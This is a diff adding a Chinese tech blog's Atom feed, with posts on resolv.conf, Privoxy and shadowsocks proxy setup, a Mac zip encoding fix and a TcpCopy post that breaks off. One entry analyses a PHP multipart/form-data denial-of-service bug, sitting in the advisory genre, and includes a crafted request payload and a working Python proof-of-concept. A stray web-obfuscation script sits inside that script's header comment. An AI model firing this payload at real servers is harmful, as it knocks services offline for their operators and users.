@@ -1,0 +1,353 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title><![CDATA[找节拍]]></title>
+  
+  <link href="/atom.xml" rel="self"/>
+  <link href="http://www.inorz.net/"/>
+  <updated>2015-10-28T08:46:46.000Z</updated>
+  <id>http://www.inorz.net/</id>
+  
+  <author>
+    <name><![CDATA[找节拍]]></name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[【DNS】resolv.conf 配置说明[转]]]></title>
+    <link href="http://www.inorz.net/2015/09/06/resolv/"/>
+    <id>http://www.inorz.net/2015/09/06/resolv/</id>
+    <published>2015-09-06T04:05:48.000Z</published>
+    <updated>2015-10-28T08:46:46.000Z</updated>
+    <content type="html"><![CDATA[<p>对这个一开始是一种半解的，看了<a href="http://www.lnmpy.com/resolv.conf-search-domain/" target="_blank" rel="external">这篇文章</a>后觉得有用，就转了过来记录一下。</p>
+<h3 id="配置说明">配置说明</h3><ol>
+<li>“nameserver”指定要进行域名解析的dnsserver的IP地址。可以定义多个IP地址，按照顺序来请求</li>
+<li>“domain”指定本地的domain，如果查询时的域名没有包含”.”，则会在此后面加上domain的值来进行解析</li>
+<li>“search”若搜索的域名没有找到，则将域名拼接上search来搜索。下面会有例子来说明。</li>
+</ol>
+<a id="more"></a>
+<p>现实中有”qh.inorz.net”，下面就以这个来说明，主要是说明”domain”和”search”的意义。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/resolv.conf&#10;&#10;########&#10;nameserver 192.168.1.1&#10;nameserver 8.8.8.8&#10;domain  inorz.net&#10;search  baidu.com inorz.net.cn</span><br></pre></td></tr></table></figure>
+<h3 id="测试">测试</h3><ol>
+<li><p>ping inorz.net</p>
+<blockquote>
+<p>这里是直接走的 nameserver</p>
+</blockquote>
+</li>
+<li><p>ping qh</p>
+<blockquote>
+<p>按顺序查找 qh, qh.inorz.net, qh.baidu.com 和 qh.inorz.net.cn<br>这里的顺序是nameserver -&gt; domain -&gt; search</p>
+</blockquote>
+</li>
+<li><p>ping qh.inorz</p>
+<blockquote>
+<p>此处就只查找 qh.inorz，qh.inorz.inorz.net 和 qh.inorz.baidu.com<br>这里的顺序是nameserver -&gt; domain -&gt; search<br>domain此时没有起到作用，因为其定义是当搜索的domain没有”.”时，则优先搜索domain，否则跳过</p>
+</blockquote>
+</li>
+</ol>
+]]></content>
+    <summary type="html">
+    <![CDATA[简单说明一下 resolv.conf 配置]]>
+    
+    </summary>
+    
+      <category term="DNS" scheme="http://www.inorz.net/tags/DNS/"/>
+    
+      <category term="dns" scheme="http://www.inorz.net/tags/dns/"/>
+    
+      <category term="resolv" scheme="http://www.inorz.net/tags/resolv/"/>
+    
+      <category term="resolv.conf" scheme="http://www.inorz.net/tags/resolv-conf/"/>
+    
+      <category term="工具使用" scheme="http://www.inorz.net/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[See you Again]]></title>
+    <link href="http://www.inorz.net/2015/05/24/see-you-again/"/>
+    <id>http://www.inorz.net/2015/05/24/see-you-again/</id>
+    <published>2015-05-24T06:35:48.000Z</published>
+    <updated>2015-10-28T08:37:37.000Z</updated>
+    <content type="html"><![CDATA[<blockquote>
+<p>看过速度7的朋友一定会对这首see you again印象非常深刻。这里找了几个版本的歌曲，可以一饱耳福了。<br>废话不多说了，下面的视频献上。</p>
+</blockquote>
+<a id="more"></a>
+<h3 id="【粤语版】">【粤语版】</h3><p>&gt;</p>
+<embed src="http://player.youku.com/player.php/sid/XOTYyMTUxNzY4/v.swf" allowfullscreen="true" quality="high" width="480" height="400" align="middle" allowscriptaccess="always" type="application/x-shockwave-flash">
+
+
+<h3 id="【中文版】">【中文版】</h3><p>&gt;</p>
+<embed src="http://player.youku.com/player.php/sid/XOTQ3MDU3NzI0/v.swf" allowfullscreen="true" quality="high" width="480" height="400" align="middle" allowscriptaccess="always" type="application/x-shockwave-flash">
+
+
+<h3 id="【再来个原版】">【再来个原版】</h3><p>&gt;</p>
+<embed src="http://player.youku.com/player.php/sid/XOTI5NDM0MDk2/v.swf" allowfullscreen="true" quality="high" width="480" height="400" align="middle" allowscriptaccess="always" type="application/x-shockwave-flash">
+]]></content>
+    <summary type="html">
+    <![CDATA[See you Again各种版本]]>
+    
+    </summary>
+    
+      <category term="主题曲" scheme="http://www.inorz.net/tags/%E4%B8%BB%E9%A2%98%E6%9B%B2/"/>
+    
+      <category term="分享" scheme="http://www.inorz.net/tags/%E5%88%86%E4%BA%AB/"/>
+    
+      <category term="速7" scheme="http://www.inorz.net/tags/%E9%80%9F7/"/>
+    
+      <category term="音乐" scheme="http://www.inorz.net/tags/%E9%9F%B3%E4%B9%90/"/>
+    
+      <category term="音乐" scheme="http://www.inorz.net/categories/%E9%9F%B3%E4%B9%90/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Centos下Privoxy的安装与配置]]></title>
+    <link href="http://www.inorz.net/2015/05/24/init-privoxy-to-centos/"/>
+    <id>http://www.inorz.net/2015/05/24/init-privoxy-to-centos/</id>
+    <published>2015-05-24T05:25:48.000Z</published>
+    <updated>2015-10-28T08:36:42.000Z</updated>
+    <content type="html"><![CDATA[<h3 id="一、【背景】">一、【背景】</h3><p>　　手上有墙外的VPS可用，部署了shadowsocks（以下简称ss），从墙外使用rsync拉文件或是IOS（未越狱）想出墙时。都比较麻烦。于是看上了Privoxy这货。可以把socks5转换为HTTP代理，也就是俗称的APN。</p>
+<p>步骤如下：<br>&gt;</p>
+<ol>
+<li>国外VPS机器分别安装ss服务端和客户端</li>
+<li>客户端直接连本机服务端</li>
+<li>部署Privoxy将ss客户端生成的sock5代理转成HTTP代理</li>
+<li>rsync或IOS端直接连接国外VPS上的HTTP代理。<br>PS：如果手头还有国内VPS的话最好是客户端和Privoxy都在国内VPS上。代理这块就比较少被检验。</li>
+</ol>
+<a id="more"></a>
+<p>　　ss的安装和配置这里就不叙述了，因为过程和配置比较简单。这篇主要还是说说负责 Privoxy 安装与设置吧。</p>
+<h3 id="二、【安装】">二、【安装】</h3><p>　　Privoxy 是一个轻量级的代理服务，不需要大量的内存进行缓存，是开源项目，官方介绍如下：<br>&gt;<br>Privoxy是一款带过滤功能的代理服务器，针对HTTP、HTTPS协议，经常跟Tor组合使用。通过Privoxy的超级过滤功能，用户从而可以保护隐私、对网页内容进行过滤、管理cookies，以及拦阻各种广告等。Privoxy可以用作单机，也可以应用到多用户的网络。</p>
+<p>　　你可以在 <a href="http://sourceforge.net/projects/ijbswa/files/" target="_blank" rel="external">这里</a> 选择适合你的版本，目前基本可以算常用桌面全版本（Unix众，Win，MacOS）。这里我选择了源码安装的方式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加一个用户给 Privoxy</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'privoxy:*:7777:7777:privoxy proxy:/no/home:/no/shell'</span> &gt;&gt; /etc/passwd</span><br><span class="line"><span class="comment"># 分配个组给 Privoxy</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'privoxy:*:7777:'</span> &gt;&gt; /etc/group</span><br><span class="line"><span class="comment"># 开始编译安装...</span></span><br><span class="line">autoheader</span><br><span class="line">autoconf</span><br><span class="line">./configure      <span class="comment"># (--help to see options)</span></span><br><span class="line">make             <span class="comment"># (the make from GNU, sometimes called gmake)</span></span><br><span class="line">make <span class="operator">-s</span> install  <span class="comment"># (to really install, -s to silence output)</span></span><br></pre></td></tr></table></figure>
+<p>　　默认安装后相应的配置在 /usr/local/etc/privoxy 目录下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 运行</span></span><br><span class="line">/etc/init.d/privoxy start</span><br></pre></td></tr></table></figure>
+<h3 id="三、【定制】">三、【定制】</h3><blockquote>
+<p>根据我们的需求来定制一下配置（将ss的sock5转换为HTTP代理），加上用户密码。</p>
+</blockquote>
+<ol>
+<li><p>配置HTTP代理端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/<span class="built_in">local</span>/etc/privoxy/config</span><br><span class="line"><span class="comment">#找到listen-address，配置HTTP代理的端口</span></span><br><span class="line">listen-address  <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">31904</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>向对应端口转发</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/<span class="built_in">local</span>/etc/privoxy/config</span><br><span class="line"><span class="comment"># 找到forward-socks5，配置要转发的端口，及特地规则。具体使用场景可以参考官方配置里写上。</span></span><br><span class="line"><span class="comment"># 这里我们配置全局转发，目前是49879端口(ss客户端)</span></span><br><span class="line">forward-socks5t   /         <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">49879</span> .</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>配置用户名和密码（如果做了防火墙只允许内部IP访问，或是免费开放给大家使用。可以无视这条）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成用户名和密码对应的base64密文</span></span><br><span class="line">perl <span class="operator">-e</span> <span class="string">"use MIME::Base64; print encode_base64('用户名:密码');"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改config文件，添加actionsfile user.action，编辑 user.action 文件中的 alias</span></span><br><span class="line">proxy = +forward-override&#123;forward <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">808</span>&#125; +add-header&#123;Proxy-authorization: Basic &lt;auth&gt;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以IP段过滤, 打开配置，找到 permit-access,里面有对应的配置模板。</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>配置完了，重启下privoxy</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/privoxy restart</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="四、【如何使用HTTP代理】">四、【如何使用HTTP代理】</h3><ol>
+<li><p>RSYNC代理</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> RSYNC_PROXY=<span class="string">'IP:PORT'</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>IOS上使用</p>
+<blockquote>
+<p>设置-WIFI-点中你连接的WIFI旁边的(i)进入WIFI设置-最下方HTTP代理-输入对应信息</p>
+</blockquote>
+</li>
+</ol>
+<h3 id="五、【FAQ】">五、【FAQ】</h3><ol>
+<li><p>按上面的配置好了，还是连接不上<br>PS：检查一下端口和防火墙有没有添加上对应的规则</p>
+</li>
+<li><p>欢迎补充。</p>
+</li>
+</ol>
+]]></content>
+    <summary type="html">
+    <![CDATA[将ss的socks5代理转换为HTTP代理]]>
+    
+    </summary>
+    
+      <category term="Privoxy" scheme="http://www.inorz.net/tags/Privoxy/"/>
+    
+      <category term="shadowsocks" scheme="http://www.inorz.net/tags/shadowsocks/"/>
+    
+      <category term="代理" scheme="http://www.inorz.net/tags/%E4%BB%A3%E7%90%86/"/>
+    
+      <category term="科学上网" scheme="http://www.inorz.net/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
+    
+      <category term="工具使用" scheme="http://www.inorz.net/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[【安全】PHP Multipartform-data 远程DOS攻击漏洞]]></title>
+    <link href="http://www.inorz.net/2015/05/21/php-multipartform-data/"/>
+    <id>http://www.inorz.net/2015/05/21/php-multipartform-data/</id>
+    <published>2015-05-21T06:45:48.000Z</published>
+    <updated>2015-10-28T08:37:18.000Z</updated>
+    <content type="html"><![CDATA[<h3 id="【漏洞摘要】">【漏洞摘要】</h3><p> 　　PHP解析multipart/form-datahttp请求的body part请求头时，重复拷贝字符串导致DOS。远程攻击者通过发送恶意构造的multipart/form-data请求，导致服务器CPU资源被耗尽，从而远程DOS服务器。
+ 　　</p>
+<p>###【影响范围】<br> 　　PHP所有版本</p>
+<a id="more"></a>
+<h3 id="【解决方案】">【解决方案】</h3><p>　　1. 5.2.17 ：<a href="https://coding.net/u/simapple/p/oldphppatch/git/blob/master/CVE-ID2015-4024/php5.2patch" target="_blank" rel="external">一个民间的补丁</a><br>　　2. 5.4.X 直接升级到最新的5.4.41</p>
+<h3 id="【漏洞入口】">【漏洞入口】</h3><p>　　PHP源码中main/ rfc1867.c负责解析multipart/form-data协议，DOS漏洞出现在main/rfc46675pxultipart_buffer_headers函数。<br>　　在详细分析漏洞函数前，先分析进入漏洞函数的路径。PHP解析multipart/form-data http请求体的入口函数在SAPI_POST_HANDLER_FUNC(rfc1867.c中的函数)，代码如下。SAPI_POST_HANDLER_FUNC函数首先解析请求的boundary。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get the boundary */</span></span><br><span class="line">boundary= <span class="built_in">strstr</span>(content_type_dup, <span class="string">"boundary"</span>);</span><br><span class="line"> <span class="keyword">if</span>(!boundary) &#123;</span><br><span class="line">     intcontent_type_len = <span class="built_in">strlen</span>(content_type_dup);</span><br><span class="line">     <span class="keyword">char</span>*content_type_lcase = estrndup(content_type_dup, content_type_len);</span><br><span class="line"></span><br><span class="line">     php_strtolower(content_type_lcase,content_type_len);</span><br><span class="line">     boundary= <span class="built_in">strstr</span>(content_type_lcase, <span class="string">"boundary"</span>);</span><br><span class="line">     <span class="keyword">if</span>(boundary) &#123;</span><br><span class="line">             boundary= content_type_dup + (boundary - content_type_lcase);</span><br><span class="line">     &#125;</span><br><span class="line">     efree(content_type_lcase);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(!boundary || !(boundary = <span class="built_in">strchr</span>(boundary, <span class="string">'='</span>))) &#123;</span><br><span class="line">       sapi_module.sapi_error(E_WARNING,<span class="string">"Missing boundary in multipart/form-data POST data"</span>);</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   boundary++;</span><br><span class="line">   boundary_len= <span class="built_in">strlen</span>(boundary);</span><br><span class="line">   …</span><br><span class="line">   …</span><br><span class="line">   <span class="keyword">while</span>(!multipart_buffer_eof(mbuff TSRMLS_CC))</span><br><span class="line">   &#123;</span><br><span class="line">                   charbuff[FILLUNIT];</span><br><span class="line">                   <span class="keyword">char</span>*cd = <span class="literal">NULL</span>, *param = <span class="literal">NULL</span>, *filename = <span class="literal">NULL</span>, *tmp = <span class="literal">NULL</span>;</span><br><span class="line">                   size_tblen = <span class="number">0</span>, wlen = <span class="number">0</span>;</span><br><span class="line">                   off_toffset;</span><br><span class="line"></span><br><span class="line">                   zend_llist_clean(&amp;header);</span><br><span class="line"></span><br><span class="line">                   <span class="keyword">if</span>(!multipart_buffer_headers(mbuff, &amp;header TSRMLS_CC)) &#123;</span><br><span class="line">                            gotofileupload_done;</span><br><span class="line">                   &#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="【漏洞原理】">【漏洞原理】</h3><p>　　在multipart_buffer_headers函数解析header对应value时，value值存在n行。每行的字符串以空白符开头或不存字符’:’，都触发以下合并value的代码块。那么解析header的value就要执行(n-1)次合并value的代码块。该代码块进行1次内存分配，2次内存拷贝，1次内存释放。当value值越来越长，将消耗大量的cpu时间。如果以拷贝一个字节为时间复杂度单位，value的长度为m，时间复杂度为m*m.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">prev_len= <span class="built_in">strlen</span>(prev_entry.value);</span><br><span class="line">     cur_len= <span class="built_in">strlen</span>(line);</span><br><span class="line"></span><br><span class="line">     entry.value= emalloc(prev_len + cur_len + <span class="number">1</span>); <span class="comment">//1次分片内存</span></span><br><span class="line">     <span class="built_in">memcpy</span>(entry.value,prev_entry.value, prev_len); <span class="comment">//1次拷贝</span></span><br><span class="line">     <span class="built_in">memcpy</span>(entry.value+ prev_len, line, cur_len);   <span class="comment">//1次拷贝</span></span><br><span class="line">     entry.value[cur_len+ prev_len] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">     entry.key= estrdup(prev_entry.key);</span><br><span class="line"></span><br><span class="line">     zend_llist_remove_tail(header);<span class="comment">//1次内存释放</span></span><br></pre></td></tr></table></figure>
+<h3 id="【漏洞利用】">【漏洞利用】</h3><p>　　构造像以下恶意的http请求，当存在350000行a\n时，在我的测试环境中，一个http请求将消耗10s的cpu时间。每隔若干秒，同时并发多个请求，将导致server端cpu资源长期耗尽，从而到达DOS。总的来说，利用方式和Hash Collision DOS一样。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundarypE33TmSNWwsMphqz</span><br><span class="line">Content-Disposition:form-data; name="file"; filename="s</span><br><span class="line">a</span><br><span class="line">a</span><br><span class="line">a</span><br><span class="line">…</span><br><span class="line">…</span><br><span class="line">…</span><br><span class="line">a"</span><br><span class="line">Content-Type:application/octet-stream</span><br><span class="line"></span><br><span class="line">why is it?</span><br><span class="line">------WebKitFormBoundarypE33TmSNWwsMphqz</span><br></pre></td></tr></table></figure>
+<h3 id="【漏洞测试】">【漏洞测试】</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span><br><span class="line">Author: Shusheng Liu,The Department of Security Cloud, Baidu</span><br><span class="line">email: liusscs@163.com</span><br><span class="line">/* &lt;![CDATA[ */!function()&#123;try&#123;var t="currentScript"in document?document.currentScript:function()&#123;for(var t=document.getElementsByTagName("script"),e=t.length;e--;)if(t[e].getAttribute("cf-hash"))return t[e]&#125;();if(t&amp;&amp;t.previousSibling)&#123;var e,r,n,i,c=t.previousSibling,a=c.getAttribute("data-cfemail");if(a)&#123;for(e="",r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)&#125;&#125;&#125;catch(u)&#123;&#125;&#125;();/* ]]&gt; */</span><br><span class="line">'''</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib,urllib2</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">http_proxy</span><span class="params">(proxy_url)</span>:</span></span><br><span class="line"></span><br><span class="line">    proxy_handler = urllib2.ProxyHandler(&#123;<span class="string">"http"</span> : proxy_url&#125;)</span><br><span class="line">    null_proxy_handler = urllib2.ProxyHandler(&#123;&#125;)</span><br><span class="line">    opener = urllib2.build_opener(proxy_handler)</span><br><span class="line">    urllib2.install_opener(opener)</span><br><span class="line"><span class="comment">#end http_proxy</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_php_multipartform_dos</span><span class="params">(url,post_body,headers)</span>:</span></span><br><span class="line">    req = urllib2.Request(url)</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> headers.keys():</span><br><span class="line">        req.add_header(key,headers[key])</span><br><span class="line">    starttime = datetime.datetime.now();</span><br><span class="line">    fd = urllib2.urlopen(req,post_body)</span><br><span class="line">    html = fd.read()</span><br><span class="line">    endtime = datetime.datetime.now()</span><br><span class="line">    usetime=(endtime - starttime).seconds</span><br><span class="line">    <span class="keyword">if</span>(usetime &gt; <span class="number">5</span>):</span><br><span class="line">        result = url+<span class="string">" is vulnerable"</span>;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span>(usetime &gt; <span class="number">3</span>):</span><br><span class="line">            result = <span class="string">"need to check normal respond time"</span></span><br><span class="line">    <span class="keyword">return</span> [result,usetime]</span><br><span class="line"><span class="comment">#end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#http_proxy("http://127.0.0.1:8089")</span></span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.add_option(<span class="string">"-t"</span>, <span class="string">"--target"</span>, action=<span class="string">"store"</span>,</span><br><span class="line">                  dest=<span class="string">"target"</span>,</span><br><span class="line">                  default=<span class="keyword">False</span>,</span><br><span class="line">          type=<span class="string">"string"</span>,</span><br><span class="line">                  help=<span class="string">"test target"</span>)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span>(options.target):</span><br><span class="line">    target = options.target</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    Num=<span class="number">350000</span></span><br><span class="line">    headers=&#123;<span class="string">'Content-Type'</span>:<span class="string">'multipart/form-data; boundary=----WebKitFormBoundaryX3B7rDMPcQlzmJE1'</span>,</span><br><span class="line">            <span class="string">'Accept-Encoding'</span>:<span class="string">'gzip, deflate'</span>,</span><br><span class="line">            <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36'</span>&#125;</span><br><span class="line">    body = <span class="string">"------WebKitFormBoundaryX3B7rDMPcQlzmJE1\nContent-Disposition: form-data; name=\"file\"; filename=sp.jpg"</span></span><br><span class="line">    payload=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,Num):</span><br><span class="line">        payload = payload + <span class="string">"a\n"</span></span><br><span class="line">    body = body + payload;</span><br><span class="line">    body = body + <span class="string">"Content-Type: application/octet-stream\r\n\r\ndatadata\r\n------WebKitFormBoundaryX3B7rDMPcQlzmJE1--"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"starting..."</span>;</span><br><span class="line">    respond=check_php_multipartform_dos(target,body,headers)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Result : "</span></span><br><span class="line">    <span class="keyword">print</span> respond[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Respond time : "</span>+str(respond[<span class="number">1</span>]) + <span class="string">" seconds"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<h3 id="【参考】">【参考】</h3><p>　　1. <a href="https://bugs.php.net/bug.php?id=69364" target="_blank" rel="external">https://bugs.php.net/bug.php?id=69364</a><br>　　2. <a href="http://php.net/ChangeLog-5.php#5.5.25" target="_blank" rel="external">http://php.net/ChangeLog-5.php#5.5.25</a><br>　　3. <a href="http://drops.wooyun.org/papers/6077" target="_blank" rel="external">http://drops.wooyun.org/papers/6077</a></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[PHP解析multipart/form-datahttp请求的body part请求头时，重复拷贝字符串导致DOS。远程攻击者通过发送恶意构造的multipart/form-data请求，导致服务器CPU资源被耗尽，从而远程DOS服务器。]]>
+    
+    </summary>
+    
+      <category term="php" scheme="http://www.inorz.net/tags/php/"/>
+    
+      <category term="安全" scheme="http://www.inorz.net/tags/%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="安全相关" scheme="http://www.inorz.net/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[解决MAC打包压缩文件在Windows下乱码]]></title>
+    <link href="http://www.inorz.net/2015/05/20/mac-dabao-luanma-windows/"/>
+    <id>http://www.inorz.net/2015/05/20/mac-dabao-luanma-windows/</id>
+    <published>2015-05-20T15:45:48.000Z</published>
+    <updated>2015-10-28T08:36:57.000Z</updated>
+    <content type="html"><![CDATA[<h3 id="【问题】">【问题】</h3><ul>
+<li>用Mac自带的归档程序打包的zip，发到windows端，显示会乱码。里面对应的文件夹的文件目录也发生变化</li>
+</ul>
+<h3 id="【原因】">【原因】</h3><ul>
+<li>是文件编码的问题，Mac 下默认是UTF-8，windows下默认为GBK</li>
+</ul>
+<a id="more"></a>
+<h3 id="【解决】">【解决】</h3><ol>
+<li>在Windows上用新版WinRAR(5.0) 以上版本直接解压即可</li>
+<li>用第三方打包软件Keka(开源、免费)，打包成.7z</li>
+</ol>
+<h3 id="【Keka下载】：">【Keka下载】：</h3><ul>
+<li>Keka: <a href="http://www.kekaosx.com/zh-cn/" target="_blank" rel="external">http://www.kekaosx.com/zh-cn/</a></li>
+</ul>
+<h3 id="【注意】">【注意】</h3><ol>
+<li>用的2345好压 直接解压不能解决此文件，，</li>
+<li>可以通过设置2345好压 的代码页 为UTF-8 来解压即可 （预览的时候还是乱码），不过解压出来就都正常了</li>
+</ol>
+]]></content>
+    <summary type="html">
+    <![CDATA[解决MAC打包压缩文件在Windows下乱码,fuqihuan]]>
+    
+    </summary>
+    
+      <category term="MAC" scheme="http://www.inorz.net/tags/MAC/"/>
+    
+      <category term="乱码" scheme="http://www.inorz.net/tags/%E4%B9%B1%E7%A0%81/"/>
+    
+      <category term="打包" scheme="http://www.inorz.net/tags/%E6%89%93%E5%8C%85/"/>
+    
+      <category term="MAC" scheme="http://www.inorz.net/categories/MAC/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[【工具】TcpCopy使用]]></title>
+    <link href="http://www.inorz.net/2015/05/20/tcpcopy/"/>
+    <id>http://www.inorz.net/2015/05/20/tcpcopy/</id>
+    <published>2015-05-20T14:45:48.000Z</published>
+    <updated>2015-10-28T08:38:32.000Z</updated>
+    <content type="html"><![CDATA[<blockquote>
+<p>有台服务器的MySQL内存，经常内涨跑涨高，所以为了调试，在一台测试机器上搭建了同样的服务，部署了同样的代码，用TcpCopy做引流做测试。</p>
+</blockquote>
+<h3 id="【Tcpcopy简介】">【Tcpcopy简介】</h3><ul>
